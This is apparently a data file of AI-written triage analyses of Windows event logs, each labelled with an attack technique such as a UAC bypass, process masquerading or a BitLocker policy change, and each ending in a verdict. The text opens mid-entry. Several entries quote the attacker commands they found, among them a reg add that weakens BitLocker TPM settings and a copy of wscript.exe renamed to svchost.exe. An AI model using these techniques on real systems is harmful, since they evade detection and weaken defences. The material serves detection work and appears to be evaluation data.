   - The presence of command lines referencing potential UAC bypass tools (`uacme/Akagi64.exe`) and repetitive execution of `wevtutil.exe` stand out as strong indicators requiring further investigation to rule out malicious activity. Additionally, confirm the legitimacy of Microsoft Edge update paths to ensure no compromise.

### Guidance:
1. **Immediate Investigation:**
   - Conduct a full endpoint investigation on `Server002` to determine if `uacme` was legitimately used for testing purposes by an authorized admin or represents an unauthorized, potentially malicious action.
   - Ascertain if the involving `wevtutil.exe` served a legitimate administrative purpose, including checking for cleared event logs which might suggest tampering.

2. **Log and Network Analysis:**
   - Review any deleted or newly-modified logs for gaps during the reported times.
   - Check network traffic for any anomalies that align with increased command executions and external communication from Edge update processes.

3. **Enhance Monitoring:**
   - Employ continuous logging and alerting mechanisms for high-risk command execution, especially those involving `cmd.exe`, `powershell.exe`, and unusual temp directory executions.
  
Proceed with these investigations to determine if actions taken warrant classification as malicious or are benign with documented administrative purpose."
Modify UseTPMKey Registry entry,"### Analysis

Upon reviewing the provided logs, several notable activities were observed:

#### Process Execution and Command-Line Arguments
1. **Repeated Use of `wevtutil.exe`**: 
   - The logs show multiple executions of `wevtutil.exe` which is a command-line tool for managing Windows event logs. The user `SERVER002\\admin_test` executed it several times within a short span.
   - While the use of this tool may not be inherently malicious (as it's used for legitimate log management tasks), frequent and repetitive execution, especially by `admin_test` without clear context, could potentially be aimed at manipulating event logs, possibly to hide other activities.

2. **Registry Modification via `cmd.exe` and `reg.exe`**:
   - A `cmd.exe` process executed a command to add a registry entry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f`. 
   - This action modifies BitLocker policies, which could potentially disable or weaken encryption security. The command has a high integrity level and runs in an unusually short time span among other processes, indicating it could be part of a script or automated action.

3. **Usage of `whoami.exe` and `hostname.exe`**:
   - The execution of `whoami.exe` and `hostname.exe` is generally used to gather information about the system and user context. While these actions can be normal during administrative tasks, when combined with other suspicious activities, they could indicate recon efforts.

#### Privilege Use
- **High Integrity Level**: Most processes run under a high integrity level which indicates operations performed with administrative privileges. This includes potentially impactful operations on the system.

#### Miscellaneous Observations
- **Edge Update Processes**: There are numerous entries related to processes and updates for Microsoft Edge. These processes appear legitimate and part of the automated update handling by the system. There's no immediate suspicion here unless combined with further evidence indicating tampering.

### Assessment
- **Suspicious Activity**: The combination of repeated executions of `wevtutil.exe`, potential alteration of security settings via the registry modification command executed through `cmd.exe` and `reg.exe`, and information gathering commands (`whoami` and `hostname`) performed in a rapid sequence is suggestive of attempts to perform actions that could alter system configurations concealment of tracks, or preparation for further exploitation.

### Resolution: SUSPICIOUS
Based on the analysis, the activities recorded in the logs indicate suspicious behavior that warrants further investigation to determine its intent and origin. While the actions themselves can be part of legitimate administrative tasks, their pattern and context suggest the possibility of malicious intent or misuse of credentials. 

### Next Steps
1. **Investigate User Activity**: Review the activities of the `SERVER002\\admin_test` user to ascertain the legitimacy of the actions taken.
2. **Assess Registry Changes**: Confirm whether the registry changes were authorized and understand their implications on system security.
3. **Monitor for Additional Indicators**: Keep monitoring the system for additional signs of unauthorized access or other suspicious proceedings.
4. **Secure and Review Logs**: Secure event logs to prevent tampering and review them for additional anomalies or patterns indicating compromise."
Masquerading - wscript.exe running as svchost.exe,"Based on a detailed review and analysis of the provided logs, let's address potential indicators of malicious activity within these logs:

### Analysis:

1. **Security Logs:**
   - Event ID 5379: This indicates a Credential Manager activity with a ReturnCode `3221226021`, which maps to `STATUS_NO_SUCH_LOGON_SESSION`. This error is not uncommon in daily system operations and typically does not indicate a compromise by itself. However, it can indicate the presence of potentially failed credential access or retrieval operations. Both MicrosoftAccount and WindowsLive attempts appear in logs, which may imply failed attempts to authenticate or retrieve validation credentials.

2. **Sysmon Logs:**
   - Many process creation events log the use of typically safe executables like `powershell.exe`, `cmd.exe`, `wevtutil.exe`, `wuauclt.exe`, and Microsoft Edge update services.
   - A noteworthy command in the log (`cmd.exe /c copy`) involves copying `wscript.exe` to a `svchost.exe` under `%APPDATA%`, and executing a VBS script (`data.003_masquerading.vbs`) using this copied `svchost.exe`. This process is highly indicative of masquerading, where a legitimate process (`svchost.exe`) is used with a malicious script to evade detection. This activity chain, including the use of a batch script and scripting host (VBS), is congruent with potential initial execution tactics seen in intrusion behavior and is strongly indicative of suspicious activity.

3. **System Logs:**
   - Windows Update Logs: Regular updates observed with standard operations for Defender and Edge do not portray suspicious activity.

### Assessment:

The above examination suggests that while several system activities (e.g., attempted credential retrieval and regular updates) are benign, the observed chain of events leading to script execution using a disguised `svchost.exe` under user `admin_test` highlights suspicious behavior that needs further investigation.

### Resolution:

**Resolution: SUSPICIOUS**

- **Threat and Risk Identified:**
  - The command execution involving `wscript.exe` as `svchost.exe` running a VBS script in a user directory is highly suspicious and could pinpoint unauthorized or adversarial activity aiming for persistence or further exploitation.

- **Guidance/Next Steps:**
  - Inspect the content of `data.003_masquerading.vbs` for malicious intent.
  - Verify user `admin_test` activity to identify any unusual access or privilege violations.
  - Conduct a comprehensive scan (anti-virus/malware) focusing on `%APPDATA%` and associated paths to identify and quarantine potential threats.
  - Review associated network connections during these timestamps for potential data exfiltration attempts.
  - Validate VBS scripts and related persistence mechanisms set up in the environment.

This determination highlights the need for deeper analysis, potential threat hunting, and proactive defenses to confirm any potential compromise and further secure the environment."
manage-bde.wsf Signed Script Command Execution,"## Analysis of Windows Event Logs

Upon review of the provided event logs, I examined several segments including System, Sysmon, and Security logs to identify any suspicious or potentially malicious activities.

### System Log:
- **Time Change Events:** There are a series of events related to system time changes initiated by `svchost.exe` running under the `LOCAL SERVICE` account. This might occur during legitimate system updates or configurations but can also be a tactic used by malware to subvert time-based security mechanisms or forensic investigations. However, without further context, time changes alone are not strong indicators of malicious activity unless they correlate with other suspicious actions.

### Sysmon Logs:
- **Process Executions:** I noticed frequent execution of `wevtutil.exe` and `conhost.exe` by the same `admin_test` user. The use of `wevtutil.exe` could be concerning if used to clear event logs or manipulate them, though this is not explicitly evident here.
- **Command Execution:** The main suspicious activity is seen with `cmd.exe`, which is executing a command line that sets `comspec` to point to `calc.exe` and then runs a script with `cscript.exe`. This behavior is highly suspicious as it manipulates environmental variables to potentially redirect a legitimate path to a different executable, which can be a technique used for executing malicious scripts.

### Security Logs:
- **Time Change Events:** Aligning with the System logs, there are consistent time change events recorded, again tied to `svchost.exe`. These do not directly indicate compromise but could correlate with the suspicious Sysmon activities.

### Indicative Anomalies:
1. **Manipulation of Environment Variables:** The manipulation of the `comspec` variable to redirect to `calc.exe` along with the execution of a script is an unusual and potentially malicious operation.
2. **Abnormal Usage of System Utilities:** Frequent invocation of `wevtutil.exe` and other command-line executables without clear operational intent suggests further investigation is needed into the scripts and commands being executed.

### Conclusion:
Based on the evidence, the logs display several anomalous activities, primarily concerning command-line usage that manipulates system operations in a potentially harmful manner. While there are signs of suspicious activity, there is not clear evidence of direct compromise or damage from the events alone. 

**Resolution:** SUSPICIOUS

### Recommended Actions:
- **Investigate the Context of the Suspicious Scripts and Commands:** Look into scripts or further command-line invocations associated with the suspicious `cmd.exe` execution to determine intent.
- **Monitor and Review Permissions and Activities of Users Involved:** Particularly `admin_test` account which appears frequently across these logs.
- **Examine System for Known Indicators of Compromise:** Utilize threat intelligence and endpoint detection tools to identify any potential matches with known malicious signatures or behaviors.

By following these recommendations, you should be able to further clarify whether these suspicious activities represent a threat to the environment."
Bypass UAC by Mocking Trusted Directories,"Based on a careful examination of the provided Windows event logs, I've summarized my analysis as below:

### Summary of Anomalies:
1. **Time Change Events**: 
    - Multiple events indicate system time changes (Event ID 4616 and 1 in Security and System logs respectively). However, these actions were performed by the ""LOCAL SERVICE"" user account which could suggest an automatic time synchronization with a time server such as NTP (Network Time Protocol).
  
2. **Admin Privileges Use**: 
    - The user ""admin_test"" gained numerous high-level privileges as indicated in Event ID 4672 immediately after a login session (Event ID 4624) from IP addresses `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102`. The acquisition of these privileges—especially `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`—can be a potential risk if it's unexpected or unauthorized.
      
3. **Process Execution**:
    - Sysmon logs capture the execution of several processes, most notably:
      - `wevtutil.exe` and `conhost.exe` are repeatedly executed by the ""admin_test"" user.
      - The creation of processes using `cmd.exe` with a suspicious command line that attempts to create a directory and copy `cmd.exe` to `mmc.exe`, as well as creating a symbolic link under the name `c:\\testbypass.exe`. This behavior is indicative of privilege escalation or payload delivery.
      - The `whoami.exe` is executed possibly to confirm the current user's privileges.
      
### Assessment of Malicious Activity:
- **Indicators of Potential Compromise**: The combination of highly privileged operations by the ""admin_test"" user, particularly involving system-critical tools like `wevtutil.exe` (which can be used to manipulate event logs), and running suspicious commands via `cmd.exe` to possibly obfuscate or bypass permissions strongly suggests malicious intent or behavior.

### Resolution:
- MALICIOUS: The activities - elevated privilege use without clear authorization, suspicious command execution, attempts to manipulate or bypass system commands - are indicators of malicious activity on the host, necessitating an immediate and thorough investigation.

### Recommended Actions:
1. **Incident Response**: 
   - Immediately isolate the affected host (""Server002"") from the network to prevent further potential lateral movement or data exfiltration.
   
2. **Audit and Investigation**:
   - Perform a full investigation into ""admin_test"" user activities and credentials for possible compromise.
   - Review all recent changes and activity logs, especially focusing on privileged accounts.
   
3. **Environment Review**:
   - Ensure that time synchronization settings are correctly configured and monitored to prevent unauthorized time changes. 
   - Audit the security policies regarding privilege allocation and access to critical system tools.

4. **System Hardening**:
   - Implement robust monitoring via SIEM (Security Information and Event Management) tools for real-time alerts on critical events.
   - Reinforce endpoint security and consider deploying application whitelisting or EDR (Endpoint Detection and Response) solutions. 

By following these actions, you can ensure that malicious activities are decisively addressed while also bolstering the overall security posture of the network and systems."
Disabling ShowUI Settings of Windows Error Reporting (WER),"Upon reviewing the Windows event logs provided, a detailed analysis of the Application, Sysmon, and various system logs has been conducted. Here's a summary of findings and assessment:

### Application Log:
1. **Edge Update Service**:
   - Multiple entries show the ""edgeupdate"" service stopped and started, indicating routine updates for Microsoft Edge. This behavior alone is not indicative of malicious activity in a corporate or server environment where auto-updates are common.

2. **Software Protection Platform Service**:
   - There is an entry for Microsoft-Windows-Security-SPP, associated with software protection policies. This entry appears routine and does not exhibit any anomalous behavior or indicative of an issue.

### Sysmon Log:
The Sysmon logs provide a more detailed view of processes and events in the system. Here are key observations:

1. **Process Executions**:
   - **whoami.exe**: Executed twice, logged with high integrity. This command is used to query user identity and is normal when conducted by an authorized or administrative process.
   - **wevtutil.exe**: Occurred multiple times, typically used to query and back up event log data, again normal if used by an admin routine.
   - **Microsoft Edge Update Processes**: There are extensive logs showing the update operations for Microsoft Edge, including the execution of updates and registration commands. These processes ran under the 'NT AUTHORITY\SYSTEM' user context, indicating legitimate and automated update activity by the system.

2. **Registry Modification**:
   - **reg.exe and cmd.exe**: A suspicious series of commands were executed by `cmd.exe` which involved modifying the registry to suppress error reporting (`DontShowUI`). While not inherently malicious, this behavior combined with admin rights needs reviewing to confirm it aligns with expected IT policies or scripts. 

3. **Command-line Observations**:
   - A mix of system and Microsoft Edge updater processes were executed with expected command-line arguments. There were no signs of obfuscated or suspiciously constructed command lines that are often indicators of malicious intent.

### Assessment:

- **BENIGN**: The majority of the logs reflect routine system processes related to updates and user queries. The execution of updating services aligns with known behavior expected in a managed IT environment.
  
- **SUSPICIOUS**: The registry modification to suppress error display via `cmd.exe` could be suspicious if not authorized or expected as part of system management activities. This would need further inquiry with IT operations to ensure it is part of a legitimate script or policy.

### Resolution & Guidance:
Given that there is no direct or conclusive evidence of uncompromised actions or tool usage outside expected operations beyond potentially suspicious registry modifications, the overall resolution for this investigation is **SUSPICIOUS**.

### Recommended Actions:
1. Verify with IT operations if registry modifications are part of a regular maintenance or deployment script.
2. Implement tighter audit logging for registry changes if such audit practices aren’t already robust.
3. Educate users and administrators on routine monitoring of executed processes and privilege operations to ensure they align with policies.

Final review suggests proactive monitoring and verification steps in line with security best-practices to validate the benign nature or highlight potential misconfigurations."
